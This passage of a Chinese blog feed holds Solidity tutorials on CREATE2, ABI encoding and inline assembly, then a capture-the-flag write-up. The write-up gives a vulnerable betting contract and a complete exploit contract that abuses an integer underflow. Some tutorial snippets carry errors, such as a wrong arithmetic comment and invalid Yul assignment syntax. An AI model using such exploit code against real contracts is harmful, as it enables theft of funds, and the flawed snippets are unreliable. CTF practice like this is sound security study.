token1));</span><br></pre></td></tr></table></figure><p><strong>事先计算Pair的地址</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 提前计算pair合约地址</span><br><span class="line">function calculateAddr(address tokenA, address tokenB) public view returns(address predictedAddress)&#123;</span><br><span class="line">  require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突</span><br><span class="line">  // 计算用tokenA和tokenB地址计算salt</span><br><span class="line">  //将tokenA和tokenB按大小排序</span><br><span class="line">  (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); </span><br><span class="line">  bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">  // 计算合约地址方法 hash()</span><br><span class="line">  predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(</span><br><span class="line">  bytes1(0xff),</span><br><span class="line">  address(this),</span><br><span class="line">  salt,</span><br><span class="line">  keccak256(type(Pair).creationCode)</span><br><span class="line">  )))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ABI编码"><a href="#ABI编码" class="headerlink" title="ABI编码"></a>ABI编码</h3><p><code>ABI</code> (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。</p><p><code>Solidity</code>中，<code>ABI编码</code>有4个函数：<code>abi.encode</code>, <code>abi.encodePacked</code>, <code>abi.encodeWithSignature</code>, <code>abi.encodeWithSelector</code>。而<code>ABI解码</code>有1个函数：<code>abi.decode</code>，用于解码<code>abi.encode</code>的数据。</p><h5 id="abi-encode"><a href="#abi-encode" class="headerlink" title="abi.encode"></a>abi.encode</h5><p><code>ABI</code>被设计出来跟智能合约交互，他将每个参数填充为32字节的数据，并拼接在一起。如果你要和合约交互，你要用的就是<code>abi.encode</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encode() public view returns(bytes memory result) &#123;</span><br><span class="line">        result = abi.encode(x,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><p><strong>abi.encode</strong> 会将每个数据都填充为 32 字节</p><h5 id="abi-encodePacked"><a href="#abi-encodePacked" class="headerlink" title="abi.encodePacked"></a>abi.encodePacked</h5><p>将给定参数根据其所需最低空间编码。它类似 <code>abi.encode</code>，但是会把其中填充的很多<code>0</code>省略。比如，只用1字节来编码<code>uint</code>类型。当你想省空间，并且不与合约交互的时候，可以使用<code>abi.encodePacked</code>，例如算一些数据的<code>hash</code>时。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encode() public view returns(bytes memory result) &#123;</span><br><span class="line">        result = abi.encodePacked(x,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0x00000000000000000000000000000000000000000000000000000000000000014b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><h5 id="abi-encodeWithSignature"><a href="#abi-encodeWithSignature" class="headerlink" title="abi.encodeWithSignature"></a>abi.encodeWithSignature</h5><p>与<code>abi.encode</code>功能类似，只不过第一个参数为<code>函数签名</code>，比如<code>&quot;foo(uint256,address)&quot;</code>。当调用其他合约的时候可以使用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encodeWithSignature() public view returns(bytes memory result) &#123;</span><br><span class="line">   result = abi.encodeWithSignature(&quot;foo(uint256,address,string,uint256[2])&quot;, x, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0xe87082f100000000000000000000000000000000000000000000000000000000000000010000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><p><code>abi.encode</code>编码结果前加上了4字节的函数选择器。 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用</p><h5 id="abi-encodeWithSelector"><a href="#abi-encodeWithSelector" class="headerlink" title="abi.encodeWithSelector"></a>abi.encodeWithSelector</h5><p>与<code>abi.encodeWithSignature</code>功能类似，只不过第一个参数为<code>函数选择器</code>，为<code>函数签名</code>Keccak哈希的前4个字节。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encodeWithSelector() public view returns(bytes memory result) &#123;</span><br><span class="line">result = abi.encodeWithSelector(bytes4(keccak256(&quot;foo(uint256,address,string,uint256[2])&quot;)), x, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0xe87082f100000000000000000000000000000000000000000000000000000000000000010000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><h5 id="abi-decode-解码"><a href="#abi-decode-解码" class="headerlink" title="abi.decode(解码)"></a>abi.decode(解码)</h5><p><code>abi.decode</code>用于解码<code>abi.encode</code>生成的二进制编码，将它还原成原本的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function decode(bytes memory data) public pure returns(uint dx, address daddr) &#123;</span><br><span class="line">      (dx, daddr) = abi.decode(data, (uint, address));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/solidity%E8%BF%9B%E9%98%B6.assets/image-20221108214419590.png" alt="image-20221108214419590"></p><h5 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h5><ol><li><p>在合约开发中，ABI常配合call来实现对合约的底层调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes4 selector = contract.getValue.selector;</span><br><span class="line">   </span><br><span class="line">bytes memory data = abi.encodeWithSelector(selector, _x);</span><br><span class="line">(bool success, bytes memory returnedData) = address(contract).staticcall(data);</span><br><span class="line">require(success);</span><br><span class="line">   </span><br><span class="line">return abi.decode(returnedData, (uint256));</span><br></pre></td></tr></table></figure></li><li><p>ethers.js中常用ABI实现合约的导入和函数调用。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> wavePortalContract = <span class="keyword">new</span> ethers.Contract(contractAddress, contractABI, signer);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Call the getAllWaves method from your Smart Contract</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> waves = <span class="keyword">await</span> wavePortalContract.getAllWaves();</span><br></pre></td></tr></table></figure></li><li><p>对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory data = abi.encodeWithSelector(bytes4(0x533ba33a));</span><br><span class="line">(bool success, bytes memory returnedData) = address(contract).staticcall(data);</span><br><span class="line">require(success);</span><br><span class="line">return abi.decode(returnedData, (uint256));</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x01-函数重载&quot;&gt;&lt;a href=&quot;#0x01-函数重载&quot; class=&quot;headerlink&quot; title=&quot;0x01 函数重载&quot;&gt;&lt;/a&gt;0x01 函数重载&lt;/h3&gt;&lt;p&gt;函数名相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，&lt;cod</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>solidity编写内联汇编</title>
    <link href="https://banana69.site/2022/08/23/solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"/>
    <id>https://banana69.site/2022/08/23/solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</id>
    <published>2022-08-23T08:51:44.000Z</published>
    <updated>2022-08-24T08:36:32.881Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p>汇编（也称为<em>汇编语言</em>）是指可使用汇编器转换为机器代码的低级编程语言。 汇编语言与物理机或虚拟机绑定，因为它们实现了指令集。 一条指令告诉CPU执行一些基本任务。</p><p>EVM是一个基于栈的虚拟机（stack machine），栈这种数据结构只允许两个操作：压入（PUSH）或弹出（POP）数据。 最后压入的数据位于栈顶，因此将被第一个弹出，这被称为后进先出 （LIFO：Last In, First Out）。栈虚拟机将所有的操作数保存在栈上，其中所有操作数都存储在栈中。 它仍然具有PC（程序计数器）和SP（堆栈指针）的存储器和寄存器，但是所有内容都存储在栈中。</p><p>至于为什么要在solidity中使用内联汇编，有以下几个优点：</p><ul><li><p><strong>细粒度控制</strong></p><p>可以使用操作码直接与EVM进行交互，这使对智能合约要执行的操作可以进行更精细的控制。</p><p>汇编代码还提供了更多仅靠Solidity不能实现的逻辑权限，例如指向特定的内存插槽，当编写合约库文件时，细粒度控制有很大的作用。</p></li><li><p><strong>减少Gas消耗</strong></p><p>在solidity中使用汇编代码还可以节省Gas，如以下例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addAssembly(uint x, uint y) public pure returns (uint) &#123;</span><br><span class="line">     assembly &#123;</span><br><span class="line">         let result := add(x, y)</span><br><span class="line">         mstore(0x0, result)</span><br><span class="line">         return(0x0, 32)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function addSolidity(uint x, uint y) public pure returns (uint) &#123;</span><br><span class="line">     return x + y;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>汇编消耗的Gas：</p><p><img src="solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96.assets/image-20220823170713555.png" alt="image-20220823170713555"></p><p>solidity消耗的Gas：</p><p><img src="solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96.assets/image-20220823170734917.png" alt="image-20220823170734917"></p><p>可以看到在简单的加操作中汇编代码要比solidity节省Gas，在更为复杂的合约中节约的Gas也会更多。</p></li><li><p>从 string 中读取数据</p><p>使用内联汇编可以在单个操作中从数据<code>string</code>和<code>bytes</code>类型中读取整个字节（256 位）。Solidity-stringutils 通过对被比较的两个字符串的 32 字节块进行减法来使用它进行非常快速的字符串比较。如果没有汇编，必须逐字节执行此操作。</p></li><li><p>一些操作没有在 Solidity 中公开。例如，sha3 操作码采用内存中的一个字节范围进行哈希计算，而同名的 Solidity 函数采用一个字符串。因此，散列字符串的一部分将需要昂贵的字符串复制操作。使用内联汇编，就可以传入一个字符串并仅对需要的位进行哈希处理。</p></li><li><p>Solidity 不支持从返回可变长度类型（如动态数组、字节或字符串）的声明为external 的函数获取返回值，但如果知道预期的长度，则可以使用内联汇编调用它们。</p></li></ul><h3 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h3><p>solidity的汇编语言更接近 EVM，其定义了俩中汇编语言的实现方式：</p><ul><li>**内联汇编（Inline Assembly )**：可以在内部Solidity源代码中使用。：</li><li><strong>独立汇编（Standalone Assembly</strong>：可以直接使用，无需Solidity。（尚未实现）</li></ul><p>在solidity中使用<code>assembly&#123;&#125;</code>来嵌入汇编代码段，这种形式的汇编被称为内联汇编，在<code>assembly</code>块内的代码开发语言被称为Yul。</p><p>需要注意的是，汇编代码块之间是不能进行通信的，即一个汇编代码块里定义的变量在另一个汇编代码块中不能被访问。（不同的内联汇编块不共享任何名称空间，即不可能调用Yul函数或访问在其他内联汇编块中定义的Yul变量）如以下代码就会报错：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123; </span><br><span class="line">    let x := 2</span><br><span class="line">&#125;    </span><br><span class="line">assembly &#123;</span><br><span class="line">    let y := x          // Error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例：计算两数之和</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Add(uint x,uint y) public pure returns(uint) &#123;</span><br><span class="line">assembly&#123;</span><br><span class="line">    let result := add(x,y) //创建一个新的变量result 使用add操作码计算x+y,将结果赋值给result</span><br><span class="line">    mstore(0x0,result)  //从内存中保存结果</span><br><span class="line">    return(0x0,32)         //从内存地址0x0返回32字节</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  在Yul中使用<code>let</code>关键字定义变量，使用 <code>:=</code>操作符赋值给变量，如果没有使用<code>:=</code>那么会将变量的值自动初始化为0。</p><h5 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h5><p>在Solidity汇编中字面量的写法与Solidity一致。不过，字符串字面量最多可以包含32个字符。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123; </span><br><span class="line"> let a := 0x123             // 16进制</span><br><span class="line"> let b := 42                // 10进制</span><br><span class="line"> let c := &quot;hello world&quot;     // 字符串</span><br><span class="line"></span><br><span class="line"> let d := &quot;very long string more than 32 bytes&quot; // 超长字符串，出错！</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// TypeError: String literal too long (35 &lt; 32)</span><br><span class="line">// let d := &quot;really long string more than 32 bytes&quot;</span><br><span class="line">// </span><br></pre></td></tr></table></figure><h5 id="块和作用域"><a href="#块和作用域" class="headerlink" title="块和作用域"></a>块和作用域</h5><p>在Solidity汇编中，变量的作用范围遵循标准规则。一个块的范围使用由一对大括号标识。变量仅在定义所在块的范围内有效，当块执行完时，块中的变量也会被销毁。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123; </span><br><span class="line"> let x := 3          // x在各处可见</span><br><span class="line"> // Scope 1 </span><br><span class="line"> &#123; </span><br><span class="line"> let y := x     // ok </span><br><span class="line"> &#125;  // 到此处会销毁y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="变量访问"><a href="#变量访问" class="headerlink" title="变量访问"></a>变量访问</h5><p>在Solidity汇编中，只需要<strong>使用变量名</strong>就可以访问局部变量， 无论该变量是定义在汇编块中，还是汇编块之外（Solidity代码中），不过变量必须是函数的局部变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function assembly_local_var_access() public pure &#123; </span><br><span class="line"> uint b = 5; </span><br><span class="line"> </span><br><span class="line"> assembly &#123;                // defined inside  an assembly block</span><br><span class="line">     let x := add(2, 3) </span><br><span class="line">     let y := 10 </span><br><span class="line">     z := add(x, y)</span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"> assembly &#123;               // defined outside an assembly block</span><br><span class="line">     let x := add(2, 3)</span><br><span class="line">     let y := mul(x, b)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="For-循环"><a href="#For-循环" class="headerlink" title="For 循环"></a>For 循环</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//solitidy中的for循环</span><br><span class="line">function for_loop_solidity(uint n, uint value) public pure returns(uint) &#123;       </span><br><span class="line">    for ( uint i = 0; i &lt; n; i++ ) &#123;</span><br><span class="line">        value = 2 * value;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//汇编代码</span><br><span class="line">function for_loop_assembly(uint n, uint value) public pure returns (uint) &#123;</span><br><span class="line">     assembly &#123;</span><br><span class="line">     //初始化 let i:=0,执行条件lt(i,n),必须是函数风格表达式，迭代后续步骤add(i,1)</span><br><span class="line">       for &#123; let i := 0 &#125; lt(i, n) &#123; i := add(i, 1) &#125; &#123; </span><br><span class="line">           value := mul(2, value) </span><br><span class="line">       &#125;   </span><br><span class="line">       mstore(0x0, value)</span><br><span class="line">       return(0x0, 32)   </span><br><span class="line">   &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    let x := 34   </span><br><span class="line">    switch lt(x, 30)</span><br><span class="line">    case true &#123;</span><br><span class="line">        // do something</span><br><span class="line">    &#125;</span><br><span class="line">    case false &#123;</span><br><span class="line">        // do something els</span><br><span class="line">    &#125;</span><br><span class="line">    default &#123;</span><br><span class="line">        // 不允许</span><br><span class="line">    &#125;           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>分支列表不需要大括号，但是分支的代码块需要大括号；</li><li>所有的分支条件值必须：1）具有相同的类型 2）具有不同的值；</li><li>如果分支条件已经涵盖所有可能的值，那么不允许再出现default条件。</li></ul><h5 id="汇编函数"><a href="#汇编函数" class="headerlink" title="汇编函数"></a>汇编函数</h5><p>在 Solidity内联汇编中定义底层函数，他们可以包含自己的逻辑，调用这些自定义的函数和使用内置的操作码一样。</p><p>下面的汇编函数用来分配指定长度<code>length</code>的内存，并返回内存指针<code>pos</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    function allocate(length) -&gt; pos &#123;</span><br><span class="line">        pos := mload(0x40)</span><br><span class="line">        mstore(0x40, add(pos, length))</span><br><span class="line">    &#125;</span><br><span class="line">    let free_memory_pointer := allocate(64)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编函数运行如下：</p><ol><li>从栈顶提取参数</li><li>将结果压入栈</li></ol><p>和Solidity函数不同，不需要指定汇编函数的可见性，例如<code>public</code>或<code>private</code>， 因为汇编函数仅在定义所在的汇编代码块内有效。</p><p>汇编变量遵循相同作用域规则。最新的 Solidity 文档对此给出了明确的解释：<strong>Yul 允许定义函数。它们不应与 Solidity 中的函数混淆，因为它们从来不是合约外部接口的一部分，并且独立于 Solidity 函数的命名空间。</strong></p><p>返回值用<code>-&gt;</code> 指定会返回一个值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    function my_assembly_function(param1, param2) -&gt; my_result &#123;</span><br><span class="line">        // param2 - (4 * param1)</span><br><span class="line">        my_result := sub(param2, mul(4, param1))</span><br><span class="line">    &#125;</span><br><span class="line">    let some_value = my_assembly_function(4, 9)  // 4 - (9 * 4) = 32</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不需要显式返回语句。为了返回一个值，只需在最终语句中将其分配给返回变量</p><blockquote><p>EVM 包含了 <code>return</code> 的内置操作代码。如果在汇编函数中编写了<code>return</code> 操作码，它将停止完全执行当前上下文（内部消息调用），而不仅仅是当前汇编函数。</p></blockquote><p>使用<code>leave</code> 关键字可以放置在汇编函数体的任意位置，以停止其执行流并退出它。它的工作原理与空返回语句完全相同，有一个例外：函数将返回上次复制的变量给返回变量，<font color=red><code>leave</code> 关键字只能在函数内使用</font>。</p><h3 id="0x03-高级汇编"><a href="#0x03-高级汇编" class="headerlink" title="0x03 高级汇编"></a>0x03 高级汇编</h3><p>EVM 操作码可以分为以下几类：</p><ul><li>算数和比较操作</li><li>位操作</li><li>密码学计算，目前仅包含<code>keccak256</code></li><li>环境操作码，主要指与区块链相关的全局信息，例如：<code>blockhash</code>或<code>coinbase</code></li><li>存储、内存和栈操作</li><li>交易与合约调用操作</li><li>停机操作</li><li>日志操作</li></ul><h5 id="多个赋值"><a href="#多个赋值" class="headerlink" title="多个赋值"></a>多个赋值</h5><p>如果调用一个函数反复多个值，可以将他们赋值给元组(tuple)。前面我们已经可以在汇编中创建函数，这些函数可以返回多个值。使用汇编函数可以一次分配多个值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">      function f() -&gt; a, b &#123;&#125;</span><br><span class="line">      let c, d := f()           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="栈平衡（Stack-balancing）"><a href="#栈平衡（Stack-balancing）" class="headerlink" title="栈平衡（Stack balancing）"></a>栈平衡（Stack balancing）</h5><p>在每个 <code>assembly &#123; ... &#125;</code> 块的末尾，必须平衡堆栈（除非另有要求）。 否则，编译器将生成警告。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x01-介绍&quot;&gt;&lt;a href=&quot;#0x01-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 介绍&quot;&gt;&lt;/a&gt;0x01 介绍&lt;/h3&gt;&lt;p&gt;汇编（也称为&lt;em&gt;汇编语言&lt;/em&gt;）是指可使用汇编器转换为机器代码的低级编程语言。 汇编语言与物</summary>
      
    
    
    
    
    <category term="solidity 智能合约" scheme="https://banana69.site/tags/solidity-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Chain Flag记录</title>
    <link href="https://banana69.site/2022/08/19/Chain-Flag%E8%AE%B0%E5%BD%95/"/>
    <id>https://banana69.site/2022/08/19/Chain-Flag%E8%AE%B0%E5%BD%95/</id>
    <published>2022-08-19T09:38:23.000Z</published>
    <updated>2022-09-16T15:46:07.724Z</updated>
    
    <content type="html"><![CDATA[<h3 id="integer-overflow"><a href="#integer-overflow" class="headerlink" title="integer overflow"></a>integer overflow</h3><h4 id="bet"><a href="#bet" class="headerlink" title="bet"></a>bet</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract bet &#123;</span><br><span class="line">    uint secret;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    mapping(address =&gt; uint) public isbet;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    function Bet() public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        balanceOf[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //to fuck</span><br><span class="line">    </span><br><span class="line">    modifier only_owner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setsecret(uint secretrcv) only_owner &#123;</span><br><span class="line">        secret=secretrcv;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function deposit() payable&#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balanceOf[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() &#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]=1;</span><br><span class="line">        balanceOf[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function betgame(uint secretguess)&#123;</span><br><span class="line">        require(balanceOf[msg.sender]&gt;0);</span><br><span class="line">        balanceOf[msg.sender]-=1;</span><br><span class="line">        if (secretguess==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+=2;</span><br><span class="line">            isbet[msg.sender]=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function doublebetgame(uint secretguess) only_owner&#123;</span><br><span class="line">        require(balanceOf[msg.sender]-2&gt;0);</span><br><span class="line">        require(isbet[msg.sender]==1);</span><br><span class="line">        balanceOf[msg.sender]-=2;</span><br><span class="line">        if (secretguess==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析题目，当账户中的余额大于<code>100000</code>时可以得到 flag，而增加账户余额的方法有俩个，<code>betgame</code>和<code>dou blebetgame</code>函数，在执行<code>betgame</code>时要求账户中的余额大于 0且需要猜中secrt，而在<code>doublebetgame</code>中的<code>balanceOf[msg.sender]-2&gt;0</code>会造成溢出。</p><p>整个的解题流程为：</p><ol><li>先调用<code>Bet()</code>函数，成为owner;</li><li>调用<code>profit</code>或<code>deposit</code>往合约中存入 1 ether，使可以通过betgame函数中的 require；</li><li>调用 <code>serSecret</code> 函数，设置 secert；</li><li>调用<code>betgame</code>函数俩次，第一次要通过 if，使<code>isBet = 1</code>，可以通过<code>doublebetgame</code>函数的第二个require，第二次调用时不能if判断，使<code>balanceOf[msg.sender]=1</code>，可以通过<code>doublebetgame</code>函数的第一个require;</li><li>调用<code>doublebetgame</code>函数，在<code>balanceOf[msg.sender]-=2;</code>处溢出；</li><li>最后调用<code>payforflag</code>函数获取flag。</li></ol><p>攻击合约为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    address constant private addr = 0x30d0a604d8c90064a0a3ca4beeea177eff3e9bcd;</span><br><span class="line">    bet public hack;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        hack = bet(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function becomeOwner() public &#123;</span><br><span class="line">        hack.Bet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  setSecret(uint num) public &#123;</span><br><span class="line">        hack.setsecret(num);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function profit() payable public &#123;</span><br><span class="line">        hack.profit();</span><br><span class="line">    &#125;</span><br><span class="line">    /*</span><br><span class="line">    或者使用 deposit() 函数存入 1 ether</span><br><span class="line">    function deposit() payable public &#123;</span><br><span class="line">        hack.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    function firstBet(uint secret) public &#123;</span><br><span class="line">        hack.betgame(secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function secondBet(uint secret) public &#123;</span><br><span class="line">        hack.doublebetgame(secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint)&#123;</span><br><span class="line">        return hack.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getIsbet() public view returns (uint)&#123;</span><br><span class="line">        return hack.isbet(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getFlag(string email) public &#123;</span><br><span class="line">        hack.payforflag(email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //fallback 函数</span><br><span class="line">    function() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="hf"><a href="#hf" class="headerlink" title="hf"></a>hf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract hf &#123;</span><br><span class="line">    address secret;</span><br><span class="line">    uint count;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    </span><br><span class="line">    struct node &#123;</span><br><span class="line">        address nodeadress;</span><br><span class="line">        uint nodenumber;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    node public node0;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        balanceOf[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //to fuck</span><br><span class="line">    </span><br><span class="line">    modifier onlySecret() &#123;</span><br><span class="line">        require(msg.sender == secret);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]=1;</span><br><span class="line">        balanceOf[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function hfvote() public payable&#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balanceOf[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function ubw() public payable&#123;</span><br><span class="line">        if (msg.value &lt; 2 ether)</span><br><span class="line">        &#123;</span><br><span class="line">            node storage n = node0;</span><br><span class="line">            n.nodeadress=msg.sender;</span><br><span class="line">            n.nodenumber=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            n.nodeadress=msg.sender;</span><br><span class="line">            n.nodenumber=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function fate(address to,uint value) public onlySecret &#123;</span><br><span class="line">        